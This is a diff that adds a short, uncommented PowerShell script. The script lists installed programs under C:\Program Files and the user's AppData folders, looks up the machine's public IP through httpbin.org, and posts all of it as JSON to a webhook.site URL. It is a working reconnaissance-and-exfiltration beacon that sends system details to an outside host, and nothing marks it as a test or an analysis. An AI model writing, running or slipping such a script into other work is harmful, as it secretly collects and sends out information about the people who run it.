@@ -1,0 +1,16 @@
+$a = Get-ChildItem -Path "C:\Program Files\" | Where-Object { $_.PSIsContainer } | Select-Object Name
+$b = [System.IO.Path]::Combine($env:APPDATA)
+$c = Get-ChildItem -Path $b -Directory | Select-Object Name
+$d = Invoke-RestMethod -Uri "https://httpbin.org/ip" -ErrorAction Stop
+$ip = $d.origin
+
+$webhookUrl = "https://webhook.site/9b5b4ee6-f917-44c2-915b-d25f6f45fcb2"
+
+$data = @{
+    "Main" = $a.Name
+    "User" = $c.Name
+    "Ip" = $ip
+}
+
+$jsonData = $data | ConvertTo-Json
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType "application/json"
